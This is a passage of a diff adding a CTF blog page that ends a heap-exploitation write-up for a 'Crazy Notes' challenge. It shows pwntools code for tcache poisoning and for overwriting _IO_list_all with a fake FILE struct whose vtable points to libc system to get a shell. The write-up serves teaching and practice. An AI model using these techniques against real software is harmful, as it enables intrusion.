+<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_wide_vtable</span><span class="o">+</span><span class="mh">0x8</span><span class="o">-</span><span class="mh">0x68</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now for the last step — overwriting <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.</p>
+
+<h2 id="overwriting-_io_list_all">Overwriting <code class="language-plaintext highlighter-rouge">_IO_list_all</code></h2>
+
+<p>To overwrite <code class="language-plaintext highlighter-rouge">_IO_list_all</code> we can’t use the same <strong>Tcache poisoning</strong> method as before, because we’d exceed the maximum number of <strong>worlds</strong> we can create.</p>
+
+<p>Since we have <strong>Arbitrary Write</strong> within the <strong>heap</strong>, we can overwrite the <strong>Tcache Entry</strong> and modify the <strong>entry</strong> for <strong>0x20</strong> chunks so the next one returned is <code class="language-plaintext highlighter-rouge">_IO_list_all</code>. Once done, simply write the pointer to our <strong>fake File Struct</strong> and exit the program.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="n">tcache_entry</span> <span class="o">=</span> <span class="n">heap_address</span><span class="o">+</span><span class="mh">0x90</span>
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">tcache_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">io_list_all</span><span class="p">))</span>
+<span class="nf">create</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">fake_file_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">4</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We run the exploit and… <strong>WE HAVE A SHELL!</strong></p>
+
+<p><img src="/assets/img/challenges/crazy-notes/poc.png" alt="PoC" /></p>
+
+<h2 id="exploit">Exploit</h2>
+<p><strong>Thanks for making it to the end!</strong></p>
+
+<p>You can find the full exploit here: <a href="/assets/scripts/crazy-notes/exploit.py">exploit.py</a></p>
+
+    </div>
+
+    <nav class="post-nav">
+      
+      <a href="/en/challenges/sessiond/" class="post-nav-link">
+        <span class="post-nav-dir">← anterior</span>
+        <span class="post-nav-title">Sessiond</span>
+      </a>
+      
+
+      <span></span>
+    </nav>
+
+  </article>
+</div>
+
+<script>
+(function() {
+  var prose = document.getElementById('prose-content');
+  var nav   = document.getElementById('toc-nav');
+  if (!prose || !nav) return;
+
+  var headings = prose.querySelectorAll('h2, h3');
+  if (headings.length === 0) return;
+
+  var ul = document.createElement('ul');
+  ul.className = 'toc-list';
+
+  headings.forEach(function(h, i) {
+    if (!h.id) {
+      h.id = 'toc-' + i + '-' + h.textContent.trim().toLowerCase().replace(/[^\w\s-]/g, '').replace(/\s+/g, '-');
+    }
+    var li = document.createElement('li');
+    li.className = 'toc-item toc-item--' + h.tagName.toLowerCase();
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.className = 'toc-link';
+    a.textContent = h.textContent;
+    li.appendChild(a);
+    ul.appendChild(li);
+  });
+
+  nav.appendChild(ul);
+
+  /* Active link highlight on scroll */
+  var links = nav.querySelectorAll('.toc-link');
+  var observer = new IntersectionObserver(function(entries) {
+    entries.forEach(function(entry) {
+      if (entry.isIntersecting) {
+        links.forEach(function(l) { l.classList.remove('toc-link--active'); });
+        var active = nav.querySelector('a[href="#' + entry.target.id + '"]');
+        if (active) active.classList.add('toc-link--active');
+      }
+    });
+  }, { rootMargin: '0px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(function(h) { observer.observe(h); });
+})();
+</script>
+</main>
+
+<footer class="footer">
+  <div class="footer__inner">
+    <div>
+      <div class="footer__brand">
+        <span class="footer__brand-dot"></span>
+        Zereza's Blog
+      </div>
+      <div class="footer__copy">© 2026 Miguel Peñaranda</div>
+    </div>
+    <div class="footer__links">
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener">github</a>
+      <a href="https://linkedin.com/in/miguel-t-pe%C3%B1aranda-padilla-227076372" target="_blank" rel="noopener">linkedin</a>
+      <a href="mailto:mig.penaranda07@gmail.com">email</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
